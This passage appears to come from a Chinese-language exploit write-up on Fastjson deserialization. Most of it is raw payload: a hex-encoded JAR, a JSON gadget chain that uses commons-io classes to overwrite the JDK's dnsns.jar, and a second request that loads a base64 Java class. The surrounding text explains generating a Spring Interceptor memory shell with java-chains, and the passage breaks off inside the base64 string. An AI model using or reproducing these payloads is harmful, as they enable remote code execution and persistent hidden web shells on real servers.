x48\\x66\\x7d\\x44\\x5f\\x48\\x56\\x0b\\x44\\x30\\x55\\x70\\x30\\x49\\x5a\\x55\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x55\\x55\\x35\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x33\\x53\\x55\\x55\\x6e\\x55\\x55\\x55\\x37\\x45\\x69\\x75\\x64\\x49\\x62\\x45\\x41\\x74\\x33\\x73\\x75\\x74\\x33\\x77\\x77\\x44\\x77\\x47\\x44\\x47\\x74\\x77\\x44\\x44\\x47\\x30\\x47\\x44\\x77\\x44\\x44\\x74\\x44\\x44\\x74\\x30\\x33\\x33\\x33\\x33\\x33\\x33\\x47\\x74\\x47\\x44\\x77\\x47\\x74\\x74\\x33\\x33\\x33\\x33\\x33\\x77\\x77\\x77\\x76\\x46\\x50\\x76\\x44\\x67\\x48\\x66\\x5a\\x56\\x47\\x48\\x76\\x47\\x48\\x4e\\x63\\x64\\x77\\x48\\x74\\x6b\\x76\\x64\\x67\\x48\\x6e\\x5f\\x5b\\x48\\x68\\x48\\x48\\x48\\x5a\\x48\\x46\\x48\\x74\\x48\\x48\\x48\\x5d\\x48\\x48\\x48\\x44\\x48\\x68\\x48\\x74\\x48\\x6c\\x48\\x7d\\x48\\x43\\x48\\x58\\x48\\x6d\\x48\\x48\\x48\\x6b\\x48\\x54\\x48\\x78\\x48\\x48\\x48\\x73\\x5a\\x5e\\x5a\\x7e\\x54\\x4f\\x48\\x41\\x6b\\x78\\x5a\\x61\\x4b\\x6b\\x44\\x7b\\x48\\x51\\x4b\\x6b\\x64\\x7b\\x48\\x51\\x4b\\x47\\x48\\x71\\x53\\x75\\x44\\x47\\x48\\x49\\x75\\x57\\x48\\x69\\x47\\x48\\x59\\x54\\x4f\\x48\\x79\\x6b\\x78\\x55\\x4b\\x6b\\x44\\x78\\x57\\x48\\x45\\x4b\\x6b\\x64\\x55\\x6f\\x57\\x48\\x45\\x4b\\x47\\x48\\x65\\x7f\\x48\\x41\\x73\\x4d\\x47\\x08\\x44\\x30\\x55\\x70\\x30\\x49\\x5a\\x55\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x55\\x55\\x35\\x6e\\x6e\\x6e\\x6e\\x6e\\x6e\\x33\\x53\\x55\\x55\\x6e\\x55\\x55\\x55\\x77\\x43\\x69\\x75\\x64\\x49\\x62\\x45\\x41\\x74\\x33\\x33\\x33\\x33\\x77\\x77\\x57\\x44\\x47\\x47\\x30\\x33\\x47\\x47\\x30\\x73\\x77\\x30\\x33\\x33\\x33\\x33\\x73\\x33\\x33\\x33\\x33\\x33\\x77\\x77\\x47\\x30\\x67\\x46\\x50\\x4d\\x4f\\x7f\\x48\\x48\\x48\\x48\\x48\\x7b\\x48\\x48\\x48\\x44\\x48\\x68\\x48\\x74\\x48\\x68\\x48\\x5f\\x48\\x48\\x48\\x5c\\x48\\x68\\x48\\x77\\x48\\x57\\x48\\x6f\\x48\\x2c\\x50\\x4b\\x01\\x02\\x00\\x00\\x0a\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x4d\\x2e\\x5a\\x4a\\x10\\x0e\\x00\\x00\\x1a\\x09\\x00\\x00\\x3a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x73\\x75\\x6e\\x2f\\x6e\\x65\\x74\\x2f\\x73\\x70\\x69\\x2f\\x6e\\x61\\x6d\\x65\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x2f\\x64\\x6e\\x73\\x2f\\x44\\x4e\\x53\\x4e\\x61\\x6d\\x65\\x53\\x65\\x72\\x76\\x69\\x63\\x65\\x44\\x65\\x73\\x63\\x72\\x69\\x70\\x74\\x6f\\x72\\x2e\\x63\\x6c\\x61\\x73\\x73\\x50\\x4b\\x05\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x68\\x00\\x00\\x00\\x68\\x0e\\x00\\x00\\x00\\x00&quot;,              &#125;,           &quot;encoder&quot;: &quot;iso-8859-1&quot;,           &quot;charset&quot;: &quot;iso-8859-1&quot;,           &quot;charsetName&quot;: &quot;iso-8859-1&quot;,           &quot;bufferSize&quot;: 1        &#125;,        &quot;branch&quot;: &#123;          &quot;@type&quot;: &quot;org.apache.commons.io.output.WriterOutputStream&quot;,          &quot;writer&quot;: &#123;            &quot;@type&quot;: &quot;org.apache.commons.io.output.LockableFileWriter&quot;,            &quot;file&quot;: &quot;/usr/local/openjdk-8/jre/lib/ext/dnsns.jar&quot;,            &quot;charset&quot;: &quot;iso-8859-1&quot;,            &quot;encoding&quot;: &quot;iso-8859-1&quot;,            &quot;lockDir&quot;: &quot;/tmp/test/&quot;,            &quot;append&quot;: false          &#125;,          &quot;decoder&quot;: &#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.util.UTF8Decoder&quot;&#125;,          &quot;charset&quot;:&quot;iso-8859-1&quot;,          &quot;charsetName&quot;:&quot;iso-8859-1&quot;,          &quot;bufferSize&quot;: 1024,          &quot;writeImmediately&quot;: true        &#125;,        &quot;closeBranch&quot;: true      &#125;    &#125;,  &quot;include&quot;:true,  &quot;boms&quot;:[&#123;                  &quot;@type&quot;: &quot;org.apache.commons.io.ByteOrderMark&quot;,                  &quot;charsetName&quot;: &quot;iso-8859-1&quot;,                  &quot;bytes&quot;:[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]                &#125;],  &quot;x&quot;:&#123;&quot;$ref&quot;:&quot;$.bOM&quot;&#125;&#125;\n\n\n\n然后生成内存马，这里也用java-chains，生成Spring Interceptor内存马：\n\n这里base64不需要URL编码\n最后加载内存马：\n&#123;&quot;@type&quot;: &quot;java.lang.Exception&quot;,&quot;@type&quot;: &quot;sun.net.spi.nameservice.dns.DNSNameServiceDescriptor&quot;,&quot;codez&quot;: &quot;yv66vgAAADIBCgEAVm9yZy9hcGFjaGUvY29sbGVjdGlvbnMvY295b3RlL2pzb250eXBlL1N1YnR5cGVSZXNvbHZlcjQzMWM5NzVkMzczMTRkNWNiNWMyZDZiOWUxNTI1NTIyBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEADWdldFVybFBhdHRlcm4BABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAAi8qCAAHAQAMZ2V0Q2xhc3NOYW1lAQBSb3JnLmFwYWNoZS5zaGlyby5jb3lvdGUubW9kdWxlLlNpbXBsZURlc2VyaWFsaXplcnMwZTcxMDZiYmJlOGU0N2U1YTcwNzAxYzgxMDg1NTI5NggACgEAD2dldEJhc2U2NFN0cmluZwEAE2phdmEvaW8vSU9FeGNlcHRpb24HAA0BABBqYXZhL2xhbmcvU3RyaW5nBwAPAQnYSDRzSUFBQUFBQUFBQUsxWGFYc1QxeFYrcnlSN2hLeUVSQVR3MGda